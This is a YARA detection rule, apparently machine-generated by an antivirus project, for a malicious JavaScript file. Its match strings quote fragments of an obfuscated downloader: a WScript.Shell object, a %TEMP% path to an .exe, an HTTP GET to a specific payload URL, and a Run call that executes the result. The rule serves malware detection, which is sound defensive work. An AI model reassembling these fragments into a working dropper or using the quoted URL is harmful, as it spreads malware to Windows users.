rule sig_20160328_9b369b2d569bf45b746f52652734e5f2 {
  meta:
    description = "datamaliciousorder - file 20160328_9b369b2d569bf45b746f52652734e5f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a41916eb0a9f4d49f2db13c4140db921e73d05b75dbf28a0e3e5bb27f7f533f5"

  strings:
    $s1  = "function Kwhqqymb() {return Hssjfsjgi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"8W4gBKeFRuYiUl.exe\";};" fullword ascii
    $s2  = "Esumqoz[Tjixflcgei](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Vmptem](Fowssvlyye() * 11)} while (Esumqoz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Hjwzzlp(Puqvsscpd, Unkwijzd){return Puqvsscpd - Unkwijzd;};" fullword ascii
    $s5  = "var Hssjfsjgi = function Gqtfsu() {return WScript[Kzmag](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xqtnsqkx(Vfzumss){Hssjfsjgi[\"Run\"](Vfzumss, Pfano, Pfano);};" fullword ascii
    $s7  = "function Butpsev() {return ((Gysixgz == true) && (Gysixgz == Fpbzcqoghc)) ? 1 : Pfano;};" fullword ascii
    $s8  = "var Pmehlvghi = new this[\"Date\"]();" fullword ascii
    $s9  = "function Ilhrpieuyg(Tryzisgjim) {var Uwzqv = (1, 2, 3, 4, 5, Tryzisgjim); return Uwzqv;};" fullword ascii
    $s10 = "function Mjwhhzuly()" fullword ascii
    $s11 = "function Rdpkc(){return Kzmag;};" fullword ascii
    $s12 = "Fpbzcqoghc = true; " fullword ascii
    $s13 = "function Ngbmxcepa(){return Fjamse;};" fullword ascii
    $s14 = "var Gysixgz = false;" fullword ascii
    $s15 = "function Fowssvlyye(){return 22;};" fullword ascii
    $s16 = "return Hjwzzlp(Hxmkpnxh, Rinfaxh);" fullword ascii
    $s17 = "var Fpbzcqoghc = false;" fullword ascii
    $s18 = " while (Rdxqhpunm){" fullword ascii
    $s19 = "Gysixgz = true; " fullword ascii
    $s20 = "var Hvyyfbfylj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}